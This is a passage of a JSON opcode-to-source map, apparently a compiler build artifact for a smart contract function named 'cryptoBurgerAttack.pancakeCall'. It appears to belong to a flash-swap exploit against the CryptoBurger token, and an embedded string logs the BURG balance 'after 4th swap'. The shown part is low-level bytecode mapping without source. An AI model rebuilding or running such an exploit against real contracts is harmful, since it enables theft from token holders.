    },
    "3034": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4894,
        5001
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "3035": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4894,
        5001
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "3037": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4894,
        5001
      ],
      "op": "DUP3",
      "path": "0"
    },
    "3038": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4894,
        5001
      ],
      "op": "RETURNDATACOPY",
      "path": "0"
    },
    "3039": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4894,
        5001
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x1F"
    },
    "3041": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4894,
        5001
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "3042": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4894,
        5001
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "3043": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4894,
        5001
      ],
      "op": "DUP2",
      "path": "0"
    },
    "3044": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4894,
        5001
      ],
      "op": "ADD",
      "path": "0"
    },
    "3045": {
      "op": "PUSH1",
      "value": "0x1F"
    },
    "3047": {
      "op": "NOT"
    },
    "3048": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4894,
        5001
      ],
      "op": "AND",
      "path": "0"
    },
    "3049": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4894,
        5001
      ],
      "op": "DUP3",
      "path": "0"
    },
    "3050": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4894,
        5001
      ],
      "op": "ADD",
      "path": "0"
    },
    "3051": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4894,
        5001
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "3053": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4894,
        5001
      ],
      "op": "MSTORE",
      "path": "0"
    },
    "3054": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4894,
        5001
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0xBFA"
    },
    "3057": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4894,
        5001
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "3058": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4894,
        5001
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "3059": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4894,
        5001
      ],
      "op": "DUP2",
      "path": "0"
    },
    "3060": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4894,
        5001
      ],
      "op": "ADD",
      "path": "0"
    },
    "3061": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4894,
        5001
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "3062": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4894,
        5001
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x2D0E"
    },
    "3065": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "jump": "i",
      "offset": [
        4894,
        5001
      ],
      "op": "JUMP",
      "path": "0"
    },
    "3066": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4894,
        5001
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "3067": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4879,
        5001
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "3068": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4879,
        5001
      ],
      "op": "POP",
      "path": "0"
    },
    "3069": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "3071": {
      "op": "DUP1"
    },
    "3072": {
      "op": "MLOAD"
    },
    "3073": {
      "op": "PUSH1",
      "value": "0x20"
    },
    "3075": {
      "op": "PUSH2",
      "value": "0x2FFE"
    },
    "3078": {
      "op": "DUP4"
    },
    "3079": {
      "op": "CODECOPY"
    },
    "3080": {
      "op": "DUP2"
    },
    "3081": {
      "op": "MLOAD"
    },
    "3082": {
      "op": "SWAP2"
    },
    "3083": {
      "op": "MSTORE"
    },
    "3084": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5109,
        5121
      ],
      "op": "DUP2",
      "path": "0",
      "statement": 24
    },
    "3085": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5122,
        5123
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "3087": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5109,
        5124
      ],
      "op": "DUP2",
      "path": "0"
    },
    "3088": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5109,
        5124
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "3089": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5109,
        5124
      ],
      "op": "DUP2",
      "path": "0"
    },
    "3090": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5109,
        5124
      ],
      "op": "LT",
      "path": "0"
    },
    "3091": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5109,
        5124
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0xC1E"
    },
    "3094": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5109,
        5124
      ],
      "op": "JUMPI",
      "path": "0"
    },
    "3095": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5109,
        5124
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0xC1E"
    },
    "3098": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5109,
        5124
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x2C93"
    },
    "3101": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "jump": "i",
      "offset": [
        5109,
        5124
      ],
      "op": "JUMP",
      "path": "0"
    },
    "3102": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5109,
        5124
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "3103": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5109,
        5124
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x20"
    },
    "3105": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5109,
        5124
      ],
      "op": "MUL",
      "path": "0"
    },
    "3106": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5109,
        5124
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x20"
    },
    "3108": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5109,
        5124
      ],
      "op": "ADD",
      "path": "0"
    },
    "3109": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5109,
        5124
      ],
      "op": "ADD",
      "path": "0"
    },
    "3110": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5109,
        5124
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "3111": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5016,
        5134
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "3113": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5016,
        5134
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "3114": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5016,
        5134
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0xC81"
    },
    "3117": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5016,
        5134
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "3118": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5016,
        5134
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "3119": {
      "op": "PUSH1",
      "value": "0x40"
    },
    "3121": {
      "op": "DUP1"
    },
    "3122": {
      "op": "DUP3"
    },
    "3123": {
      "op": "MSTORE"
    },
    "3124": {
      "op": "PUSH1",
      "value": "0x3C"
    },
    "3126": {
      "op": "SWAP1"
    },
    "3127": {
      "op": "DUP3"
    },
    "3128": {
      "op": "ADD"
    },
    "3129": {
      "op": "MSTORE"
    },
    "3130": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "3132": {
      "op": "DUP1"
    },
    "3133": {
      "op": "MLOAD"
    },
    "3134": {
      "op": "PUSH1",
      "value": "0x20"
    },
    "3136": {
      "op": "PUSH2",
      "value": "0x2FDE"
    },
    "3139": {
      "op": "DUP4"
    },
    "3140": {
      "op": "CODECOPY"
    },
    "3141": {
      "op": "DUP2"
    },
    "3142": {
      "op": "MLOAD"
    },
    "3143": {
      "op": "SWAP2"
    },
    "3144": {
      "op": "MSTORE"
    },
    "3145": {
      "op": "PUSH1",
      "value": "0x60"
    },
    "3147": {
      "op": "DUP3"
    },
    "3148": {
      "op": "ADD"
    },
    "3149": {
      "op": "MSTORE"
    },
    "3150": {
      "op": "PUSH32",
      "value": "0x204255524720746F6B656E2061667465722034746820737761703A2000000000"
    },
    "3183": {
      "op": "PUSH1",
      "value": "0x80"
    },
    "3185": {
      "op": "DUP3"
    },
    "3186": {
      "op": "ADD"
    },
    "3187": {
      "op": "MSTORE"
    },
    "3188": {
      "op": "PUSH1",
      "value": "0x20"
    },
    "3190": {
      "op": "DUP2"
    },
    "3191": {
      "op": "ADD"
    },
    "3192": {
      "op": "SWAP2"
    },
    "3193": {
      "op": "SWAP1"
    },
    "3194": {
      "op": "SWAP2"
    },
    "3195": {
      "op": "MSTORE"
    },
    "3196": {
      "op": "PUSH1",
      "value": "0xA0"
    },
    "3198": {
      "op": "ADD"
    },
    "3199": {
      "op": "SWAP1"
    },
    "3200": {
      "op": "JUMP"
    },
    "3201": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5016,
        5134
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "3202": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5016,
        5134
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "3204": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5016,
        5134
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "3205": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5016,
        5134
      ],
      "op": "DUP1",
      "path": "0"
    },
    "3206": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5016,
        5134
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "3207": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5016,
        5134
      ],
      "op": "SUB",
      "path": "0"
    },
    "3208": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5016,
        5134
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "3209": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5016,
        5134
      ],
      "op": "LOG1",
      "path": "0"
    },
    "3210": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5206,
        5220
      ],
      "op": "PUSH1",
      "path": "0",
      "statement": 25,
      "value": "0x0"
    },
    "3212": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5206,
        5220
      ],
      "op": "SLOAD",
      "path": "0"
    },
    "3213": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5206,
        5245
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "3215": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5206,
        5245
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "3216": {
      "op": "PUSH4",
      "value": "0x70A08231"
    },
    "3221": {
      "op": "PUSH1",
      "value": "0xE0"
    },
    "3223": {
      "op": "SHL"
    },
    "3224": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5206,
        5245
      ],
      "op": "DUP2",
      "path": "0"
    },
    "3225": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5206,
        5245
      ],
      "op": "MSTORE",
      "path": "0"
    },
    "3226": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5239,
        5243
      ],
      "op": "ADDRESS",
      "path": "0"
    },
    "3227": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5206,
        5245
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x4"
    },
    "3229": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5206,
        5245
      ],
      "op": "DUP3",
      "path": "0"
    },
    "3230": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5206,
        5245
      ],
      "op": "ADD",
      "path": "0"
    },
    "3231": {
      "op": "MSTORE"
    },
    "3232": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "3234": {
      "op": "DUP1"
    },
    "3235": {
      "op": "MLOAD"
    },
    "3236": {
      "op": "PUSH1",
      "value": "0x20"
    },
    "3238": {
      "op": "PUSH2",
      "value": "0x2FFE"
    },
    "3241": {
      "op": "DUP4"
    },
    "3242": {
      "op": "CODECOPY"
    },
    "3243": {
      "op": "DUP2"
    },
    "3244": {
      "op": "MLOAD"
    },
    "3245": {
      "op": "SWAP2"
    },
    "3246": {
      "op": "MSTORE"
    },
    "3247": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5149,
        5255
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "3248": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "3250": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "3252": {
      "op": "PUSH1",
      "value": "0xA0"
    },
    "3254": {
      "op": "SHL"
    },
    "3255": {
      "op": "SUB"
    },
    "3256": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5206,
        5220
      ],
      "op": "AND",
      "path": "0"
    },
    "3257": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5206,
        5220
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "3258": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5206,
        5230
      ],
      "op": "PUSH4",
      "path": "0",
      "value": "0x70A08231"
    },
    "3263": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5206,
        5230
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "3264": {
      "op": "PUSH1",
      "value": "0x24"
    },
    "3266": {
      "op": "ADD"
    },
    "3267": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5206,
        5245
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x20"
    },
    "3269": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5206,
        5245
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "3271": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5206,
        5245
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "3272": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5206,
        5245
      ],
      "op": "DUP1",
      "path": "0"
    },
    "3273": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5206,
        5245
      ],
      "op": "DUP4",
      "path": "0"
    },
    "3274": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5206,
        5245
      ],
      "op": "SUB",
      "path": "0"
    },
    "3275": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5206,
        5245
      ],
      "op": "DUP2",
      "path": "0"
    },
    "3276": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5206,
        5245
      ],
      "op": "DUP7",
      "path": "0"
    },
    "3277": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5206,
        5245
      ],
      "op": "GAS",
      "path": "0"
    },
    "3278": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5206,
        5245
      ],
      "op": "STATICCALL",
      "path": "0"
    },
    "3279": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5206,
        5245
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "3280": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5206,
        5245
      ],
      "op": "DUP1",
      "path": "0"
    },
    "3281": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5206,
        5245
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "3282": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5206,
        5245
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0xCDF"
    },
    "3285": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5206,
        5245
      ],
      "op": "JUMPI",
      "path": "0"
    },
    "3286": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5206,
        5245
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "3287": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5206,
        5245
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "3289": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5206,
        5245
      ],
      "op": "DUP1",
      "path": "0"
    },
    "3290": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5206,
        5245
      ],
      "op": "RETURNDATACOPY",
      "path": "0"
    },
    "3291": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5206,
        5245
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "3292": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5206,
        5245
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "3294": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5206,
        5245
      ],
      "op": "REVERT",
      "path": "0"
    },
    "3295": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5206,
        5245
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "3296": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5206,
        5245
      ],
      "op": "POP",
      "path": "0"
    },
    "3297": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5206,
        5245
      ],
      "op": "POP",
      "path": "0"
    },
    "3298": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5206,
        5245
      ],
      "op": "POP",
      "path": "0"
    },
    "3299": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5206,
        5245
      ],
      "op": "POP",
      "path": "0"
    },
    "3300": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5206,
        5245
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "3302": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5206,
        5245
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "3303": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5206,
        5245
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "3304": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5206,
        5245
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x1F"
    },
    "3306": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5206,
        5245
      ],
      "op": "NOT",
      "path": "0"
    },
    "3307": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5206,
        5245
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x1F"
    },
    "3309": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5206,
        5245
      ],
      "op": "DUP3",
      "path": "0"
    },
    "3310": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5206,
        5245
      ],
      "op": "ADD",
      "path": "0"
    },
    "3311": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5206,
        5245
      ],
      "op": "AND",
      "path": "0"
    },
    "3312": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5206,
        5245
      ],
      "op": "DUP3",
      "path": "0"
    },
    "3313": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5206,
        5245
      ],
      "op": "ADD",
      "path": "0"
    },
    "3314": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5206,
        5245
      ],
      "op": "DUP1",
      "path": "0"
    },
    "3315": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5206,
        5245
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "3317": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5206,
        5245
      ],
      "op": "MSTORE",
      "path": "0"
    },
    "3318": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5206,
        5245
      ],
      "op": "POP",
      "path": "0"
    },
    "3319": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5206,
        5245
      ],
      "op": "DUP2",
      "path": "0"
    },
    "3320": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5206,
        5245
      ],
      "op": "ADD",
      "path": "0"
    },
    "3321": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5206,
        5245
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "3322": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5206,
        5245
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0xD03"
    },
    "3325": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5206,
        5245
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "3326": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5206,
        5245
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "3327": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5206,
        5245
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x2DCC"
    },
    "3330": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "jump": "i",
      "offset": [
        5206,
        5245
      ],
      "op": "JUMP",
      "path": "0"
    },
    "3331": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5206,
        5245
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "3332": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5149,
        5255
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "3334": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5149,
        5255
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "3335": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5149,
        5255
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0xD10"
    },
    "3338": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5149,
        5255
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "3339": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5149,
        5255
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "3340": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5149,
        5255
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x2DE5"
    },
    "3343": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "jump": "i",
      "offset": [
        5149,
        5255
      ],
      "op": "JUMP",
      "path": "0"
    },
    "3344": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5149,
        5255
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "3345": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5149,
        5255
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "3347": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5149,
        5255
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "3348": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5149,
        5255
      ],
      "op": "DUP1",
      "path": "0"
    },
    "3349": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5149,
        5255
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "3350": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5149,
        5255
      ],
      "op": "SUB",
      "path": "0"
    },
    "3351": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5149,
        5255
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "3352": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5149,
        5255
      ],
      "op": "LOG1",
      "path": "0"
    },
    "3353": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5266,
        5330
      ],
      "op": "PUSH2",
      "path": "0",
      "statement": 26,
      "value": "0xD4C"
    },
    "3356": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "3358": {
      "op": "DUP1"
    },
    "3359": {
      "op": "MLOAD"
    },
    "3360": {
      "op": "PUSH1",
      "value": "0x20"
    },
    "3362": {
      "op": "PUSH2",
      "value": "0x2F9E"
    },
    "3365": {
      "op": "DUP4"
    },
    "3366": {
      "op": "CODECOPY"
    },
    "3367": {
      "op": "DUP2"
    },
    "3368": {
      "op": "MLOAD"
    },
    "3369": {
      "op": "SWAP2"
    },
    "3370": {
      "op": "MSTORE"
    },
    "3371": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "3373": {
      "op": "DUP1"
    },
    "3374": {
      "op": "MLOAD"
    },
    "3375": {
      "op": "PUSH1",
      "value": "0x20"
    },
    "3377": {
      "op": "PUSH2",
      "value": "0x2F7E"
    },
    "3380": {
      "op": "DUP4"
    },
    "3381": {
      "op": "CODECOPY"
    },
    "3382": {
      "op": "DUP2"
    },
    "3383": {
      "op": "MLOAD"
    },
    "3384": {
      "op": "SWAP2"
    },
    "3385": {
      "op": "MSTORE"
    },
    "3386": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5287,
        5299
      ],
      "op": "DUP4",
      "path": "0"
    },
    "3387": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5300,
        5301
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "3389": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5287,
        5302
      ],
      "op": "DUP2",
      "path": "0"
    },
    "3390": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5287,
        5302
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "3391": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5287,
        5302
      ],
      "op": "DUP2",
      "path": "0"
    },
    "3392": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5287,
        5302
      ],
      "op": "LT",
      "path": "0"
    },
    "3393": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5287,
        5302
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x614"
    },
    "3396": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5287,
        5302
      ],
      "op": "JUMPI",
      "path": "0"
    },
    "3397": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5287,
        5302
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x614"
    },
    "3400": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5287,
        5302
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x2C93"
    },
    "3403": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "jump": "i",
      "offset": [
        5287,
        5302
      ],
      "op": "JUMP",
      "path": "0"
    },
    "3404": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5266,
        5330
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "3405": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5355,
        5462
      ],
      "op": "PUSH1",
      "path": "0",
      "statement": 27,
      "value": "0x40"
    },
    "3407": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5355,
        5462
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "3408": {
      "op": "PUSH4",
      "value": "0x7C0329D"
    },
    "3413": {
      "op": "PUSH1",
      "value": "0xE2"
    },
    "3415": {
      "op": "SHL"
    },
    "3416": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5355,
        5462
      ],
      "op": "DUP2",
      "path": "0"
    },
    "3417": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        5355,
        5462
      ],
      "op": "MSTORE",
      "path": "0"
    },
    "3418": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "3420": {
      "op": "DUP1"
    },
    "3421": {
      "op": "MLOAD"
    },
    "3422": {
      "op": "PUSH1",
      "value": "0x20"
    },
    "3424": {
      "op": "PUSH2",
      "value": "0x2FBE"
    },
    "3427": {
      "op": "DUP4"
    },
    "3428": {
      "op": "CODECOPY"
    },
    "3429": {
      "op": "DUP2"
    },
    "3430": {
      "op": "MLOAD"
    },
    "3431": {
      "op": "SWAP2"
    },
    "3432": {
      "op": "MSTORE"
    },
    "3433": {
      "offset": [
        526,
        568
      ],
      "op": "SWAP1",
